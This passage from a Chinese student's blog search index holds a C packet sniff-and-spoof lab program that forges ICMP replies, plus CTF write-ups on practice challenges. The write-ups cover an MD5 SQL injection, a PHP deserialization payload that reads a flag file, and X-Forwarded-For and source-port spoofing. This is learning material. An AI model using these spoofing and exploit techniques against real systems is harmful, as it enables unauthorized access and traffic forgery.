class="hljs-function"></span>&#123;    ethernet = (struct sniff_ethernet *)(packet);    ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);    <span class="hljs-keyword">char</span>* src = inet_ntoa(ip-&gt;ip_src);    <span class="hljs-keyword">char</span>* dst = inet_ntoa(ip-&gt;ip_dst);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"got a icmp request packet src addr: %s\n"</span>, inet_ntoa(ip-&gt;ip_src));     <span class="hljs-built_in">printf</span>(<span class="hljs-string">"dst addr :%s\nsend a reply \n"</span>, inet_ntoa(ip-&gt;ip_dst));    <span class="hljs-keyword">int</span> sd;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sin</span>;</span>    sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);     <span class="hljs-keyword">if</span>(sd &lt; <span class="hljs-number">0</span>)     &#123;        perror(<span class="hljs-string">"socket() error"</span>);         <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;    <span class="hljs-built_in">sin</span>.sin_family = AF_INET;    <span class="hljs-keyword">char</span> <span class="hljs-built_in">buffer</span>[<span class="hljs-number">1024</span>] = &#123;        <span class="hljs-comment">//ip</span>        <span class="hljs-number">0x45</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x1c</span>,        <span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,        <span class="hljs-number">0x80</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,        <span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,        <span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,        <span class="hljs-comment">//icmp  </span>        <span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xff</span>,        <span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,    &#125;;    insertip(ip-&gt;ip_src,<span class="hljs-built_in">buffer</span>,<span class="hljs-number">16</span>);    insertip(ip-&gt;ip_dst,<span class="hljs-built_in">buffer</span>,<span class="hljs-number">12</span>);    <span class="hljs-keyword">if</span>(sendto(sd, <span class="hljs-built_in">buffer</span>, <span class="hljs-number">20</span>+<span class="hljs-number">8</span>, <span class="hljs-number">0</span>, (struct sockaddr *)&amp;<span class="hljs-built_in">sin</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">sin</span>)) &lt; <span class="hljs-number">0</span>) &#123;    perror(<span class="hljs-string">"sendto() error"</span>);     <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);&#125;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">char</span> *dev;<span class="hljs-comment">/* capture device name */</span><span class="hljs-keyword">char</span> errbuf[PCAP_ERRBUF_SIZE];<span class="hljs-comment">/* error buffer */</span><span class="hljs-keyword">pcap_t</span> *handle;<span class="hljs-comment">/* packet capture handle */</span><span class="hljs-keyword">char</span> filter_exp[] = <span class="hljs-string">"icmp and icmp[0] = 8"</span>;<span class="hljs-comment">/* filter expression [3] */</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_program</span> <span class="hljs-title">fp</span>;</span><span class="hljs-comment">/* compiled filter program (expression) */</span>bpf_u_int32 mask;<span class="hljs-comment">/* subnet mask */</span>bpf_u_int32 net;<span class="hljs-comment">/* ip */</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pcap_pkthdr</span> <span class="hljs-title">header</span>;</span>    <span class="hljs-keyword">const</span> u_char *packet;    <span class="hljs-comment">/* find a capture device if not specified on command-line */</span>dev = pcap_lookupdev(errbuf);<span class="hljs-keyword">if</span> (dev == <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Couldn't find default device: %s\n"</span>,errbuf);<span class="hljs-keyword">return</span> (<span class="hljs-number">2</span>);&#125;<span class="hljs-comment">/* get network number and mask associated with capture device */</span><span class="hljs-keyword">if</span> (pcap_lookupnet(dev, &amp;net, &amp;mask, errbuf) == <span class="hljs-number">-1</span>) &#123;<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Couldn't get netmask for device %s: %s\n"</span>, dev, errbuf);net = <span class="hljs-number">0</span>;mask = <span class="hljs-number">0</span>;&#125;<span class="hljs-comment">/* print capture info */</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">"Device: %s\n"</span>, dev);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Filter expression: %s\n"</span>, filter_exp);<span class="hljs-comment">/* open capture device */</span>handle = pcap_open_live(dev, BUFSIZ, <span class="hljs-number">1</span>, <span class="hljs-number">1000</span>, errbuf);<span class="hljs-keyword">if</span> (handle == <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Couldn't open device %s: %s\n"</span>, dev, errbuf);<span class="hljs-keyword">return</span>(<span class="hljs-number">2</span>);&#125;<span class="hljs-comment">/* compile the filter expression */</span><span class="hljs-keyword">if</span> (pcap_compile(handle, &amp;fp, filter_exp, <span class="hljs-number">0</span>, net) == <span class="hljs-number">-1</span>) &#123;<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Couldn't parse filter %s: %s\n"</span>,    filter_exp, pcap_geterr(handle));<span class="hljs-keyword">return</span>(<span class="hljs-number">2</span>);&#125;<span class="hljs-comment">/* apply the compiled filter */</span><span class="hljs-keyword">if</span> (pcap_setfilter(handle, &amp;fp) == <span class="hljs-number">-1</span>) &#123;<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Couldn't install filter %s: %s\n"</span>,    filter_exp, pcap_geterr(handle));<span class="hljs-keyword">return</span>(<span class="hljs-number">2</span>);&#125;<span class="hljs-comment">/* now we can set our callback function */</span>pcap_loop(handle, <span class="hljs-number">-1</span>, got_packet, <span class="hljs-literal">NULL</span>);pcap_close(handle);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\nCapture complete.\n"</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>其中，一些数据结构来自于网站提供的sniffex.c,insertip（）函数的作用是将VM A发送的IP的源地址与目的地址分别作为VM B构造的ICMP报文的目的地址与源地址，之后，当执行回调函数got_packet的时候，需要在回调函数got_packet里面调用insert（）函数，下面是运行结果。</p><p><img src="/2020/10/02/Web-Security-lab1/task2.3_3.PNG" srcset="/img/loading.gif" alt="task2.3_3"></p><p>现在VM A上面ping一个地址</p><p><img src="/2020/10/02/Web-Security-lab1/task2.3_1.PNG" srcset="/img/loading.gif" alt="task2.3_1"></p><p>在VM B上编译运行sniff_and_spoof.c</p><p><img src="/2020/10/02/Web-Security-lab1/task2.3_2.PNG" srcset="/img/loading.gif" alt="task2.3_2"></p><p>之后在VM B上面运行wireshark抓包，可以看到有echo reply</p>]]></content>
    
    
    
    <tags>
      
      <tag>Packet sniffing and spoofing lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>8/9CTF一周学习总结</title>
    <link href="/2020/08/09/8-9CTF%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <url>/2020/08/09/8-9CTF%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="Web第二周学习"><a href="#Web第二周学习" class="headerlink" title="Web第二周学习"></a>Web第二周学习</h1><p>[TOC]</p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><blockquote><p>需要密码才能获得flag哦</p><p>题目链接：<a href="[http://web.jarvisoj.com:32772]">http://web.jarvisoj.com:32772</a></p></blockquote><h3 id="基本思路："><a href="#基本思路：" class="headerlink" title="基本思路："></a>基本思路：</h3><p>客户端将用户输入的字符串传递给了服务器端，而服务器端需要和真正的password进行对比，所以我用burp来进行分析</p><p><img src="/2020/08/09/8-9CTF%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/login.PNG" srcset="/img/loading.gif" alt="login"></p><p>我通过burp获取到了response的header，分析其中的hint</p><blockquote><p>Hint:”select * from <code>admin</code> where password=’”.md5($pass,true).”‘“</p></blockquote><p>第二个值为TRUE，说明通过md5加密后的字符串是16位原始二进制的数</p><p><img src="/2020/08/09/8-9CTF%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/md5.PNG" srcset="/img/loading.gif" alt="md5"></p><p>后面有关PHP的一些东西我是参考了网上相关的blog，下面将一些东西引用过来</p><blockquote><p>“a string starting with a 1 is cast as an integer when used as a boolean.”<br>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1  ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。<br>当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）</p></blockquote><p><img src="/2020/08/09/8-9CTF%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/login_%E7%AD%94%E6%A1%88.PNG" srcset="/img/loading.gif" alt="login_答案"></p><p>之后我们就可以获得相应的flag</p><h2 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><blockquote><p>这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？</p><p>题目链接：<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/</a></p></blockquote><h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>刚看到的时候属实有点小懵，不明白到底要让我干啥，还是借鉴了几篇blog才明白，参考的blog在最后给出</p><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>刚开始打开，只能看到一个图片</p><p><img src="/2020/08/09/8-9CTF%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E7%A5%9E%E7%9B%BE%E5%B1%80.PNG" srcset="/img/loading.gif" alt="神盾局"></p><p>在控制台打开之后发现了被base64编码之后的字符串</p><blockquote><p>解码前：c2hpZWxkLmpwZw==</p><p>解码后：shield.jpg</p></blockquote><p>此处用的base64的在线解码的网站，mark一下，方便之后使用，<a href="https://base64.us/" target="_blank" rel="noopener">网站入口</a></p><p>之后我通过看其他的blog看到需要访问index.php(但是说实话，我到现在还是有点不明白为啥要访问这个文件)</p><blockquote><p>编码前：index.php</p><p>编码后：aW5kZXgucGhw</p></blockquote><p>之后的话修改访问的文件链接，即可获得index.php文件的内容</p><pre><code class="hljs php">&lt;!--?php <span class="hljs-keyword">require_once</span>(<span class="hljs-string">'shield.php'</span>);$x = <span class="hljs-keyword">new</span> Shield();<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="hljs-string">'class'</span>];<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($g)) &#123;$x = unserialize($g);&#125;<span class="hljs-keyword">echo</span> $x---&gt;</code></pre><blockquote><p>可以发现该index.php文件有三个作用</p><ol><li>它require_once了shield.php文件</li><li>它可以获取一个名为class的参数</li><li>之后它将这个参数进行了反序列化</li></ol></blockquote><p>发现有一个shield.php文件，进行base64的编码</p><blockquote><p>编码前：shield.php</p><p>编码后：c2hpZWxkLnBocA==</p></blockquote><p>同样的方式，打开shield.php文件</p><pre><code class="hljs php">&lt;!--?php<span class="hljs-comment">//flag is in pctf.php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shield</span> </span>&#123;<span class="hljs-keyword">public</span> $file;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($filename = <span class="hljs-string">''</span>)</span> </span>&#123;<span class="hljs-keyword">$this</span> ---&gt;</code></pre><p>在注释中发现pctf.php，同样进行base64编码后访问，但是并没有做完（我要裂开了，这到底是因为啥。。）</p><p><img src="/2020/08/09/8-9CTF%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E7%A5%9E%E7%9B%BE%E5%B1%80_1.PNG" srcset="/img/loading.gif" alt="神盾局_1"></p><p>再重新对代码进行审计，发现之前少访问了showimg.php这个文件</p><pre><code class="hljs php">&lt;!--?php$f = $_GET[<span class="hljs-string">'img'</span>];<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($f)) &#123;$f = base64_decode($f);<span class="hljs-keyword">if</span> (stripos($f,<span class="hljs-string">'..'</span>)===<span class="hljs-keyword">FALSE</span> &amp;&amp; stripos($f,<span class="hljs-string">'/'</span>)===<span class="hljs-keyword">FALSE</span> &amp;&amp; stripos($f,<span class="hljs-string">'\\'</span>)===<span class="hljs-keyword">FALSE</span>&amp;&amp; stripos($f,<span class="hljs-string">'pctf'</span>)===<span class="hljs-keyword">FALSE</span>) &#123;readfile($f);&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"File not found!"</span>;&#125;&#125;?--&gt;</code></pre><p>发现其中对于解码后的文件名是“pctf”进行了限制，所以不能通过这种方式来获取文件内容</p><p>之后就需要用到index.php了（前面已经提到过index.php的作用）</p><p>index.php在接收到这个class之后，会把这个参数反序列化，并且来创建一个shield对象，之后是调用这个对象的readfile方法</p><p>所以我们需要做的事情是创建一个我们需要的shield对象，并且继续宁一个序列化输出之后，就是我们所要得到的class参数的值</p><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shield</span> </span>&#123;</span><span class="php">        <span class="hljs-keyword">public</span> $file;</span><span class="php">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($filename = <span class="hljs-string">'pctf.php'</span>)</span> </span>&#123;</span><span class="php">            <span class="hljs-keyword">$this</span> -&gt; file = $filename;</span><span class="php">        &#125;</span><span class="php">&#125;</span><span class="php">$str = <span class="hljs-keyword">new</span> Shield();</span><span class="php"><span class="hljs-keyword">echo</span> serialize($str);</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><p>之后再将构造所得的输入进去，在控制台可以看到我们想要得到的结果</p><pre><code class="hljs dust"><span class="xml"><span class="hljs-comment">&lt;!--?php </span></span><span class="xml">//Ture Flag : PCTF</span><span class="hljs-template-variable">&#123;W3lcome_To_Shi3ld_secret_Ar3a&#125;</span><span class="xml">//Fake flag:</span><span class="xml">echo "FLAG: PCTF</span><span class="hljs-template-variable">&#123;I_4m_not_fl4g&#125;</span><span class="xml">"</span><span class="xml">?--&gt;</span></code></pre><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://blog.csdn.net/weixin_30407099/article/details/98115259?biz_id=102&utm_term=unserialize%E5%87%BD%E6%95%B0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-98115259&spm=1018.2118.3001.4187" target="_blank" rel="noopener">反序列与序列化函数的作用</a></p><p><a href="https://blog.csdn.net/weixin_40412037/article/details/104632595?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522159670609519724839231358%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=159670609519724839231358&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v3~pc_rank_v4-2-104632595.first_rank_ecpm_v3_pc_rank_v4&utm_term=php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&spm=1018.2118.3001.4187" target="_blank" rel="noopener">PHP反序列化漏洞原理及举例</a></p><p><a href="https://blog.csdn.net/weixin_44077544/article/details/89407129" target="_blank" rel="noopener">神盾局的秘密</a></p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>PHP反序列化漏洞</p><p>反序列化与序列化</p><p>感觉这道题花费时间有点小长，主要是有很多的地方感觉一点没明白，像PHP的基本语法、PHP文件等地方。而且更重要的是感觉到现在并没有构建一个大致的理论框架来进行支撑。</p><h2 id="in-a-mess"><a href="#in-a-mess" class="headerlink" title="in a mess"></a>in a mess</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><blockquote><p>连出题人自己都忘了flag放哪了，只记得好像很混乱的样子。</p><p>题目链接：<a href="http://web.jarvisoj.com:32780/" target="_blank" rel="noopener">http://web.jarvisoj.com:32780/</a></p></blockquote><h3 id="基本思路-1"><a href="#基本思路-1" class="headerlink" title="基本思路"></a>基本思路</h3><p>在看到链接的id = 1的时候，我觉得有可能与SQL数据库操作有关系，之后可以在控制台上看到一些线索</p><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><p><img src="/2020/08/09/8-9CTF%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/mess.PNG" srcset="/img/loading.gif" alt="mess"></p><p>之后对于index.phps进行访问（因为php文件都是在索引之后，发送回客户端之前就会进行执行的，所以在客户端只能通过查看源码来进行代码分析）</p><pre><code class="hljs awk">&amp;lt;?phperror_reporting(<span class="hljs-number">0</span>);echo <span class="hljs-string">"&amp;lt;!--index.phps--&amp;gt;"</span>;<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>])&#123;header(<span class="hljs-string">'Location: index.php?id=1'</span>);<span class="hljs-keyword">exit</span>();&#125;<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>];<span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'a'</span>];<span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'b'</span>];<span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$a</span>,<span class="hljs-string">'.'</span>))&#123;echo <span class="hljs-string">'Hahahahahaha'</span>;return ;&#125;<span class="hljs-variable">$data</span> = @file_get_contents(<span class="hljs-variable">$a</span>,<span class="hljs-string">'r'</span>);<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>==<span class="hljs-string">"1112 is a nice lab!"</span> and <span class="hljs-variable">$id</span>==<span class="hljs-number">0</span> and strlen(<span class="hljs-variable">$b</span>)&amp;gt;<span class="hljs-number">5</span> and eregi(<span class="hljs-string">"111"</span>.substr(<span class="hljs-variable">$b</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">"1114"</span>) and substr(<span class="hljs-variable">$b</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)!=<span class="hljs-number">4</span>)&#123;require(<span class="hljs-string">"flag.txt"</span>);&#125;<span class="hljs-keyword">else</span>&#123;print <span class="hljs-string">"work harder!harder!harder!"</span>;&#125;?&amp;gt;</code></pre><p>后面的有的地方还没明白，在看一些和SQL以及PHP相关的资料，具体内容稍后上传</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>7/24Web一周总结</title>
    <link href="/2020/07/25/7-24Web%E4%B8%80%E5%91%A8%E6%80%BB%E7%BB%93/"/>
    <url>/2020/07/25/7-24Web%E4%B8%80%E5%91%A8%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>#7/24一周总结–CTF学习篇</p><p>感觉对于CTF缺乏一定系统性的学习，之后可能会看一些相关的书，搭配着做题可能效果会比较好一些，下面是一些相关的题目。</p><p><a href="https://www.jarvisoj.com" target="_blank" rel="noopener">点击跳转至OJ平台</a></p><p>##PORT51</p><p> 题目链接：<a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">PORT 51</a></p><img src="/2020/07/25/7-24Web%E4%B8%80%E5%91%A8%E6%80%BB%E7%BB%93/Users\Frank\Pictures\Screenshots\PORT51.PNG" srcset="/img/loading.gif" alt="PORT51" style="zoom:38%;"><p>我们可以看出来这个网站对应的端口号是32770端口，是服务器端的端口号，而要求我们在客户端通过port 51来向服务端发送request请求，通过查阅可以知道是需要用到curl命令的</p><blockquote><pre><code class="hljs angelscript">curl --local-port <span class="hljs-number">51</span> http:<span class="hljs-comment">//web.jarvisoj.com:32770/</span></code></pre></blockquote><p>之后就可以看到这道题的flag</p><img src="/2020/07/25/7-24Web%E4%B8%80%E5%91%A8%E6%80%BB%E7%BB%93/Users\Frank\Pictures\Screenshots\PORT51_answer.PNG" srcset="/img/loading.gif" alt="PORT51_answer" style="zoom:38%;"><p>最后进行输入验证，哦吼！</p><img src="/2020/07/25/7-24Web%E4%B8%80%E5%91%A8%E6%80%BB%E7%BB%93/Users\Frank\Pictures\Screenshots\PORT51_验证.PNG" srcset="/img/loading.gif" style="zoom:38%;"><p>##localhost access only</p><p>题目链接：<a href="http://web.jarvisoj.com:32774/" target="_blank" rel="noopener">localhost access only</a></p><p><img src="/2020/07/25/7-24Web%E4%B8%80%E5%91%A8%E6%80%BB%E7%BB%93/C:%5CUsers%5CFrank%5CPictures%5CScreenshots%5Clocalhost.PNG" srcset="/img/loading.gif" alt="localhost"></p><p>###1.题目分析</p><p>localhost access only 的意思是只允许本机进行访问，而我们能够得知，本机的IP为127.0.0.1，所以我们在这里考虑构造一个新的request报文，要求源IP地址为127.0.0.1，进一步考虑，我们可能需要用到的是burpsuit来截包</p><p>之后的话，通过查阅知道，可以通多X_Forward_For 127.0.0.1来构造一个原始客户端为local host的报文</p><p>最后点击“Forward”来进行发送即可</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF、Web学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>article title</title>
    <link href="/2020/07/20/article-title/"/>
    <url>/2020/07/20/article-title/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2020/07/19/hello-world/"/>
    <url>/2020/07/19/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="hljs bash">$ hexo new <span class="hljs-string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="hljs bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="hljs bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="hljs bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
